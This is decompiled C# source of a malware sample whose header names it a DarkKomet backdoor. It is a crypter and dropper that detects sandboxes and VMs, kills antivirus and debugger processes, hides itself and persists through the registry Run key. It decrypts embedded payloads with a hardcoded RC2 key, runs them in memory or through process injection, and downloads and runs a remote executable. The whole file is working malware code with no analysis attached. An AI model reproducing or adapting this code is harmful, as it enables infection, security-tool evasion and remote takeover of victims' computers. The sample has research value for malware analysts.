// Decompiled with JetBrains decompiler
// Type: Class1
// Assembly: Farmdaten by Missiont0pwn, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 74DA0A5F-E4BD-42E2-B8F4-246A8CD298CF
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Backdoor.Win32.DarkKomet.hcoa-f58c24dfd47cf948debeec7d4cba92bd016a7e322864fb363f25e9b489bbb9b9.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using My;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

public class Class1
{
  [STAThread]
  public static void Main()
  {
    ResourceManager resourceManager = new ResourceManager("N", Assembly.GetExecutingAssembly());
    if (Operators.ConditionalCompareObjectEqual(resourceManager.GetObject("MUT"), (object) "MUT", false) && Process.GetProcessesByName(Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.ModuleName)).Length > 1)
      Application.Exit();
    new Thread(new ThreadStart(Class1.a)).Start();
    if (Operators.ConditionalCompareObjectEqual(resourceManager.GetObject("MLT"), (object) "MLT", false))
    {
      int num = 0;
      while (num != 20)
      {
        try
        {
          Interaction.Shell("cmd");
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        checked { ++num; }
      }
    }
    Process[] processes = Process.GetProcesses();
    if (Process.GetProcessesByName(Conversions.ToString(resourceManager.GetObject("Kas"))).Length >= 1)
      Thread.Sleep(10000);
    else if (Process.GetProcessesByName(Conversions.ToString(resourceManager.GetObject("Vbox"))).Length >= 1)
      Thread.Sleep(10000);
    else if (Process.GetProcessesByName(Conversions.ToString(resourceManager.GetObject("VPC"))).Length >= 1)
      Thread.Sleep(10000);
    else if (Process.GetProcessesByName(Conversions.ToString(resourceManager.GetObject("Kas"))).Length >= 1)
      Thread.Sleep(10000);
    else if (Process.GetProcessesByName(Conversions.ToString(resourceManager.GetObject("VMW"))).Length >= 1)
      Thread.Sleep(10000);
    else if (Process.GetProcessesByName(Conversions.ToString(resourceManager.GetObject("SAND"))).Length >= 1)
      Thread.Sleep(10000);
    int num1 = checked (processes.Length - 1);
    int index = 0;
    while (index <= num1)
    {
      string Left = Strings.LCase(processes[index].ProcessName);
      if (Operators.ConditionalCompareObjectEqual((object) Left, resourceManager.GetObject("PanD"), false))
        processes[index].Kill();
      else if (Operators.ConditionalCompareObjectEqual((object) Left, resourceManager.GetObject("ZA"), false))
        processes[index].Kill();
      else if (Operators.ConditionalCompareObjectEqual((object) Left, resourceManager.GetObject("OLL"), false))
        processes[index].Kill();
      else if (Operators.ConditionalCompareObjectEqual((object) Left, resourceManager.GetObject("MBA"), false))
        processes[index].Kill();
      else if (Operators.ConditionalCompareObjectEqual((object) Left, resourceManager.GetObject("EST"), false))
        processes[index].Kill();
      else if (Operators.ConditionalCompareObjectEqual((object) Left, resourceManager.GetObject("HJT"), false))
        processes[index].Kill();
      else if (Operators.ConditionalCompareObjectEqual((object) Left, resourceManager.GetObject("BITD"), false))
        processes[index].Kill();
      else if (Operators.ConditionalCompareObjectEqual((object) Left, resourceManager.GetObject("KESC"), false))
        processes[index].Kill();
      checked { ++index; }
    }
    if (Operators.ConditionalCompareObjectEqual(resourceManager.GetObject("HEX"), (object) "HEX", false))
      File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden);
    if (Operators.ConditionalCompareObjectEqual(resourceManager.GetObject("ASU"), (object) "ASU", false))
    {
      File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Path.GetFileName(Application.ExecutablePath));
      File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Path.GetFileName(Application.ExecutablePath), FileAttributes.Hidden);
      MyProject.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("1" + Application.ProductName, (object) (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Path.GetFileName(Application.ExecutablePath)));
    }
    if (Operators.ConditionalCompareObjectEqual(resourceManager.GetObject("STD"), (object) "STD", false))
      Interaction.Shell("Shutdown -s -t 00", AppWinStyle.Hide);
    byte[] inputBuffer = (byte[]) resourceManager.GetObject("W");
    byte[] numArray1;
    using (RC2CryptoServiceProvider cryptoServiceProvider = new RC2CryptoServiceProvider())
    {
      cryptoServiceProvider.IV = new byte[8]
      {
        (byte) 8,
        (byte) 7,
        (byte) 6,
        (byte) 5,
        (byte) 4,
        (byte) 3,
        (byte) 2,
        (byte) 1
      };
      cryptoServiceProvider.Key = new byte[16]
      {
        (byte) 0,
        (byte) 1,
        (byte) 2,
        (byte) 3,
        (byte) 4,
        (byte) 5,
        (byte) 6,
        (byte) 7,
        (byte) 8,
        (byte) 9,
        (byte) 0,
        (byte) 1,
        (byte) 2,
        (byte) 3,
        (byte) 4,
        (byte) 5
      };
      numArray1 = cryptoServiceProvider.CreateDecryptor().TransformFinalBlock(inputBuffer, 0, inputBuffer.Length);
    }
    byte[] numArray2 = (byte[]) resourceManager.GetObject("SH");
    string osFullName = MyProject.Computer.Info.OSFullName;
    try
    {
      Process.Start(new ProcessStartInfo(Conversions.ToString(resourceManager.GetObject("ADF")))
      {
        WindowStyle = ProcessWindowStyle.Hidden
      });
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    string str1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\svchost.exe";
    Thread thread1 = new Thread(new ThreadStart(Class1.RunFromMemory2));
    thread1.TrySetApartmentState(ApartmentState.STA);
    try
    {
      if (Class1.DotnetFileCheck(numArray2))
        thread1.Start();
      else if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + " (x86)"))
      {
        MyProject.Computer.FileSystem.WriteAllBytes(str1, numArray2, false);
        Process.Start(str1);
      }
      else
        PE32.RunPE(numArray2, Environment.GetEnvironmentVariable("windir") + "\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe");
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    Thread thread2 = new Thread(new ThreadStart(Class1.RunFromMemory));
    thread2.TrySetApartmentState(ApartmentState.STA);
    if (Class1.DotnetFileCheck(numArray1))
      thread2.Start();
    else if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + " (x86)"))
    {
      string str2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class1.rc4("œh\\®N\u0015Gp=uÛ?J", "sikandar");
      MyProject.Computer.FileSystem.WriteAllBytes(str2, numArray1, false);
      Process.Start(str2);
    }
    else
      PE32.RunPE(numArray1, Environment.GetEnvironmentVariable("windir") + "\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe");
    new Thread(new ThreadStart(Class1.Downloader)).Start();
    if (!Operators.ConditionalCompareObjectEqual(resourceManager.GetObject("TRUE"), (object) true, false))
      return;
    if (Operators.ConditionalCompareObjectEqual(resourceManager.GetObject("BTNCTR"), (object) "WARN", false))
    {
      int num2 = (int) MessageBox.Show(Conversions.ToString(resourceManager.GetObject("MSG")), Conversions.ToString(resourceManager.GetObject("TI")), MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
    }
    else if (Operators.ConditionalCompareObjectEqual(resourceManager.GetObject("BTNCTR"), (object) "OK", false))
    {
      int num3 = (int) MessageBox.Show(Conversions.ToString(resourceManager.GetObject("MSG")), Conversions.ToString(resourceManager.GetObject("TI")), MessageBoxButtons.OK, MessageBoxIcon.Hand);
    }
    else
    {
      if (!Operators.ConditionalCompareObjectEqual(resourceManager.GetObject("BTNCTR"), (object) "OKCANCEL", false))
        return;
      int num4 = (int) MessageBox.Show(Conversions.ToString(resourceManager.GetObject("MSG")), Conversions.ToString(resourceManager.GetObject("TI")), MessageBoxButtons.OKCancel, MessageBoxIcon.Hand);
    }
  }

  public static void Downloader()
  {
    try
    {
      ResourceManager resourceManager = new ResourceManager("N", Assembly.GetExecutingAssembly());
      string str = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\explorer.exe";
      MyProject.Computer.Network.DownloadFile(Conversions.ToString(resourceManager.GetObject("DD")), str);
      while (!File.Exists(str))
        Thread.Sleep(1000);
      Process.Start(str);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static bool DotnetFileCheck(byte[] path)
  {
    bool flag;
    try
    {
      Assembly.Load(path);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      flag = false;
      ProjectData.ClearProjectError();
      goto label_3;
    }
    flag = true;
label_3:
    return flag;
  }

  public static void a()
  {
    ResourceManager resourceManager = new ResourceManager("N", Assembly.GetExecutingAssembly());
    try
    {
      Thread.Sleep(checked (Conversions.ToInteger(resourceManager.GetObject("DL")) * 1000));
      while (true)
      {
        Process[] processes = Process.GetProcesses();
        int index = 0;
        while (index < processes.Length)
        {
          Process process = processes[index];
          if (Conversions.ToBoolean(NewLateBinding.LateGet(resourceManager.GetObject("ANT"), (System.Type) null, "Contains", new object[1]
          {
            (object) process.ProcessName
          }, (string[]) null, (System.Type[]) null, (bool[]) null)))
            process.Kill();
          checked { ++index; }
        }
        Thread.Sleep(1);
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static string rc4(string message, string password)
  {
    int index1 = 0;
    int index2 = 0;
    StringBuilder stringBuilder = new StringBuilder();
    string empty = string.Empty;
    int[] numArray1 = new int[257];
    int[] numArray2 = new int[257];
    int length = password.Length;
    int location1 = 0;
    while (location1 <= (int) byte.MaxValue)
    {
      char String = password.Substring(location1 % length, 1).ToCharArray()[0];
      numArray2[location1] = Strings.Asc(String);
      numArray1[location1] = location1;
      Math.Max(Interlocked.Increment(ref location1), checked (location1 - 1));
    }
    int index3 = 0;
    int location2 = 0;
    while (location2 <= (int) byte.MaxValue)
    {
      index3 = checked (index3 + numArray1[location2] + numArray2[location2]) % 256;
      int num = numArray1[location2];
      numArray1[location2] = numArray1[index3];
      numArray1[index3] = num;
      Math.Max(Interlocked.Increment(ref location2), checked (location2 - 1));
    }
    location1 = 1;
    while (location1 <= message.Length)
    {
      index1 = checked (index1 + 1) % 256;
      index2 = checked (index2 + numArray1[index1]) % 256;
      int num1 = numArray1[index1];
      numArray1[index1] = numArray1[index2];
      numArray1[index2] = num1;
      int num2 = numArray1[checked (numArray1[index1] + numArray1[index2]) % 256];
      int CharCode = Strings.Asc(message.Substring(checked (location1 - 1), 1).ToCharArray()[0]) ^ num2;
      stringBuilder.Append(Strings.Chr(CharCode));
      Math.Max(Interlocked.Increment(ref location1), checked (location1 - 1));
    }
    string str = stringBuilder.ToString();
    stringBuilder.Length = 0;
    return str;
  }

  public static void RunFromMemory()
  {
    byte[] inputBuffer = (byte[]) new ResourceManager("N", Assembly.GetExecutingAssembly()).GetObject("W");
    byte[] rawAssembly;
    using (RC2CryptoServiceProvider cryptoServiceProvider = new RC2CryptoServiceProvider())
    {
      cryptoServiceProvider.IV = new byte[8]
      {
        (byte) 8,
        (byte) 7,
        (byte) 6,
        (byte) 5,
        (byte) 4,
        (byte) 3,
        (byte) 2,
        (byte) 1
      };
      cryptoServiceProvider.Key = new byte[16]
      {
        (byte) 0,
        (byte) 1,
        (byte) 2,
        (byte) 3,
        (byte) 4,
        (byte) 5,
        (byte) 6,
        (byte) 7,
        (byte) 8,
        (byte) 9,
        (byte) 0,
        (byte) 1,
        (byte) 2,
        (byte) 3,
        (byte) 4,
        (byte) 5
      };
      rawAssembly = cryptoServiceProvider.CreateDecryptor().TransformFinalBlock(inputBuffer, 0, inputBuffer.Length);
    }
    Assembly assembly = Assembly.Load(rawAssembly);
    MethodInfo entryPoint = assembly.EntryPoint;
    object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(assembly.CreateInstance(entryPoint.Name))));
    entryPoint.Invoke(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objectValue))), new object[1]
    {
      (object) new string[1]{ "1" }
    });
  }

  public static void RunFromMemory2()
  {
    Assembly assembly = (Assembly) NewLateBinding.LateGet((object) null, typeof (Assembly), "Load", new object[1]
    {
      RuntimeHelpers.GetObjectValue(new ResourceManager("N", Assembly.GetExecutingAssembly()).GetObject("SH"))
    }, (string[]) null, (System.Type[]) null, (bool[]) null);
    MethodInfo entryPoint = assembly.EntryPoint;
    object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(assembly.CreateInstance(entryPoint.Name))));
    entryPoint.Invoke(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objectValue))), new object[1]
    {
      (object) new string[1]{ "1" }
    });
  }
}
